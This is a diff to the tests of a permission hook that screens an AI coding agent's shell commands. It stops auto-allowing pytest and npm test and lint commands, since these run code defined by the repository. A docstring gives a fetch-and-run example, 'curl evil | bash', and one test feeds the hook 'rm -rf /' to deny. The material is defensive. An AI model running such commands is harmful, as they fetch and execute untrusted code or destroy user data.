@@ -128,9 +128,6 @@ class TestDecideChainOperators:
 
 
 class TestDecideSafeBashPrefixes:
-    def test_pytest_allowed(self):
-        assert decide("Bash", {"command": "pytest tests/ -v"}) == ("allow", "")
-
     def test_git_log_allowed(self):
         assert decide("Bash", {"command": "git log --oneline -10"}) == ("allow", "")
 
@@ -148,9 +145,6 @@ class TestDecideSafeBashPrefixes:
 
     def test_mypy_allowed(self):
         assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")
-
-    def test_python_m_pytest_allowed(self):
-        assert decide("Bash", {"command": "python -m pytest tests/"}) == ("allow", "")
 
     def test_unknown_command_asks(self):
         behavior, _ = decide("Bash", {"command": "docker run nginx"})
@@ -225,6 +219,55 @@ class TestDecideSensitivePathRead:
         assert behavior == "allow"
 
 
+class TestDecideCodeRunnersRequireConfirmation:
+    """Regression (HIGH, external security audit 2026-07-17, SEC-01): pytest,
+    python -m pytest, npm test, npm run test, and npm run lint were all
+    auto-allowed by prefix match. Each of these EXECUTES repository-defined
+    code (conftest.py/fixtures/plugins for pytest, an arbitrary shell command
+    from package.json's "scripts" section for npm) before Claude's agent gets
+    a chance to review it -- a malicious conftest.py or a package.json test
+    script reading `"test": "curl evil | bash"` would run with the user's
+    privileges the moment an agent ran "the tests" in an untrusted repository,
+    with zero confirmation. ruff/mypy are legitimately different: both are
+    pure static analyzers that never execute the code they check.
+    """
+
+    def test_pytest_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "pytest tests/ -v"})
+        assert behavior == "ask"
+
+    def test_python_m_pytest_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "python -m pytest tests/"})
+        assert behavior == "ask"
+
+    def test_npm_test_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "npm test"})
+        assert behavior == "ask"
+
+    def test_npm_run_test_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "npm run test"})
+        assert behavior == "ask"
+
+    def test_npm_run_lint_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "npm run lint"})
+        assert behavior == "ask"
+
+    def test_pytest_lookalike_executable_asks_not_allow(self):
+        """The old prefix match also collided on any command merely
+        starting with "pytest" -- e.g. a `pytest-malicious` binary on PATH.
+        Removing pytest from SAFE_BASH_PREFIXES closes this too."""
+        behavior, _ = decide("Bash", {"command": "pytest-malicious --flag"})
+        assert behavior == "ask"
+
+    def test_ruff_still_allowed(self):
+        """Static analyzers are a different risk class -- they don't execute
+        the code they analyze -- and should remain auto-allowed."""
+        assert decide("Bash", {"command": "ruff check ."}) == ("allow", "")
+
+    def test_mypy_still_allowed(self):
+        assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")
+
+
 class TestDecidePriority:
     def test_dangerous_beats_chain_operator(self):
         # WHY: dangerous patterns checked BEFORE chain operators in decide()
@@ -261,27 +304,42 @@ class TestMain:
         output = buf.getvalue().strip()
         return json.loads(output) if output else {}
 
-    def test_main_allow_for_read(self, monkeypatch):
-        result = self._call_main(monkeypatch, {"tool_name": "Read", "tool_input": {}})
-        decision = result["hookSpecificOutput"]["decision"]
-        assert decision["behavior"] == "allow"
+    def test_main_allows_safe_bash(self, monkeypatch):
+        # WHY a real Bash command, not tool_name="Read" (regression, external
+        # review 2026-07-18, SEC-03 follow-up): this hook is registered ONLY
+        # under PreToolUse matcher "Bash" -- a non-Bash tool_name never
+        # reaches it in production, so exercising main() with tool_name="Read"
+        # tested a path main() can technically handle but that never fires.
+        # decide("Read", {}) itself is still covered directly by
+        # TestDecideAlwaysSafeTools above.
+        result = self._call_main(
+            monkeypatch,
+            {"tool_name": "Bash", "tool_input": {"command": "git status"}},
+        )
+        output = result["hookSpecificOutput"]
+        assert output["hookEventName"] == "PreToolUse"
+        assert output["permissionDecision"] == "allow"
 
     def test_main_deny_for_rm_rf(self, monkeypatch):
         result = self._call_main(
             monkeypatch,
             {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}},
         )
-        decision = result["hookSpecificOutput"]["decision"]
-        assert decision["behavior"] == "deny"
-        assert "message" in decision
+        output = result["hookSpecificOutput"]
+        assert output["permissionDecision"] == "deny"
+        assert "rm -rf" in output["permissionDecisionReason"]
 
-    def test_main_ask_for_unknown_tool(self, monkeypatch):
+    def test_main_asks_for_unknown_bash_command(self, monkeypatch):
+        # WHY "docker run nginx" (a real, reachable Bash command), not
+        # tool_name="UnknownTool" (same regression as test_main_allows_safe_bash
+        # above): only unrecognized BASH commands reach this hook in
+        # production, not arbitrary non-Bash tool names.
         result = self._call_main(
             monkeypatch,
-            {"tool_name": "UnknownTool", "tool_input": {}},
+            {"tool_name": "Bash", "tool_input": {"command": "docker run nginx"}},
         )
-        decision = result["hookSpecificOutput"]["decision"]
-        assert decision["behavior"] == "ask"
+        output = result["hookSpecificOutput"]
+        assert output["permissionDecision"] == "ask"
 
     def test_main_empty_stdin_no_crash(self, monkeypatch, capsys):
         monkeypatch.setattr("sys.stdin", io.StringIO("{}"))
